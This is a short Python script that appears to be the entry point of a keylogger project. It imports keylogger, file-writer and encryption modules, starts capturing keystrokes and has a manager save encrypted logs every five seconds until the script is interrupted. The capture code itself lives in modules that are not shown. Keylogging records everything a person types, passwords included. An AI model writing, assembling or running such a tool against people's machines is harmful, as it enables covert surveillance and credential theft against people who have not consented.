from keylogger.encryption.encryption import Encryption
from keylogger.KeyliggerServise.KeyloggerServise import KeyLogger
from keylogger.writer.IWriter import FileWriter
from keylogger.KeyLoggerManager.Manager import KeyLoggerManager


keylogger = KeyLogger()
keylogger.start_logging()
writer = FileWriter()
encryption = Encryption("IDF")


manager = KeyLoggerManager(keylogger, writer, encryption, interval=5)
manager.start()

try:
    while True:
        pass  
except KeyboardInterrupt:
    manager.stop()
    keylogger.stop_logging()
